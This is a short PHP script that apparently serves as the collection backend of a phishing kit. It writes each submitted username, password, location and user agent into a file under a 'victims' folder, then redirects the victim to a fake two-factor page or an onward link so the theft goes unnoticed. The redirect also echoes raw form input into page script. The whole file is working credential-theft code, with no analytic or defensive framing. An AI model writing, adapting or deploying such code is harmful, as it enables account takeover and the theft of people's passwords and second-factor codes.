<?php if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{


 file_put_contents(".././victims/password.txt", "\nusername=" . $_POST['username']. "\npassword=".$_POST['password']."\nFrom=".$_POST['location']."\nUser-agent=".$_SERVER['HTTP_USER_AGENT']."\n", FILE_APPEND);


 if ($_POST['TFA_Enabled'] == "True" and file_exists(".././2FA_sites/".$_POST['name']))
 {
 
	  echo "<script>window.location.replace('.././2FA_sites/".$_POST['name']."');</script>";

 
 } else 
 {
	echo "<script>window.location.replace('".$_POST['link']."');</script>";

 }
 
}
?>
